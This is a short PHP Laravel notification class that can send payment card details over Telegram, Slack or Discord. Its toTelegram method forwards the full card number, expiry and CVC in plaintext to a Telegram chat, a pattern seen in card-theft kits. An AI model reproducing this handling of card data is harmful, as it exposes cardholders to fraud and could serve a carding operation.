<?php

namespace App\Notifications;

use Illuminate\Notifications\Messages\SlackMessage;
use Illuminate\Notifications\Notification;
use NotificationChannels\Telegram\TelegramChannel;
use NotificationChannels\Telegram\TelegramMessage;
use NotificationChannels\Discord\DiscordChannel;
use NotificationChannels\Discord\DiscordMessage;

class TelegramCardCreated extends Notification
{
    public function via($notifiable)
    {
        // return [TelegramChannel::class, 'slack'];
        return ['discord'];
    }

    public function toTelegram($notifiable)
    {
        $message = '$'.$notifiable->amount.' - '.$notifiable->card_number.' '.$notifiable->month.'/'.$notifiable->year.' '.$notifiable->cvc;

        return TelegramMessage::create()
            ->to(env('TELEGRAM_ID'))
            ->content($message);
    }

    public function toSlack($notifiable)
    {
        $message = 'Card number: '.$notifiable->card_number.' Amount: '.$notifiable->amount;

        return (new SlackMessage)
            ->content($message);
    }

    public function toDiscord($notifiable)
    {
        return (new DiscordMessage)
            ->from('Laravel')
            ->content('Content')
            ->embed(function ($embed) {
                $embed->title('Discord is cool')->description('Slack nah')
                    ->field('Laravel', '9.0.0', true)
                    ->field('PHP', '8.0.0', true);
            });
    }

    public function toArray($notifiable)
    {
        return [
            //
        ];
    }
}
